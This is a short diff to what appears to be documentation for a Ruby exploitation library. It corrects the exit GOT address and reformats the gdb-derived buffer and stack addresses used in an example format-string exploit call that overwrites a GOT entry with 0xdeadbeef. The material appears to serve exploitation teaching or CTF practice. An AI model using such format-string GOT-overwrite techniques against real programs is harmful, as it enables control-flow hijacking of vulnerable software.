@@ -53,7 +53,11 @@ Get exploit parameters using gdb.
 0xbffff2f0:     0xbffff30c
 ```
 
-exit GOT is 0x804a008. buffer address is 0xbffff30c and esp is 0xbffff2e0.
+exit GOT : 0x804a014
+
+buffer : 0xbffff30c
+
+esp : 0xbffff2e0.
 
 ```ruby
 Pwnbox::Pwnable.fsb(0x804a014, 0xbffff30c - 0xbffff2f0, [0xdeadbeef].pack('<I'))
